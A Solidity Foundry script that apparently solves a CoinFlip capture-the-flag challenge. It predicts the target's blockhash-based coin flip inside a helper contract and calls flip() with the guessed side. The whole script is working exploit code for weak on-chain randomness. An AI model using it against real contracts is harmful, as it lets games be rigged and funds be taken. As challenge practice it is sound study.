//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {CoinFlip} from "../src/CoinFlip.sol";
import {Script, console} from "forge-std/Script.sol";

contract Player {
    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(CoinFlip _coinFlipInstance) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        _coinFlipInstance.flip(side);
    }
}

contract CoinFlipSolution is Script {
    CoinFlip public coinflipInstance = CoinFlip(0xE0eAFaEd411B2f52A50dB2FABF560e64CbF0f0a8);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new Player(coinflipInstance);
        console.log("wins :", coinflipInstance.consecutiveWins());
        vm.stopBroadcast();
    }
}
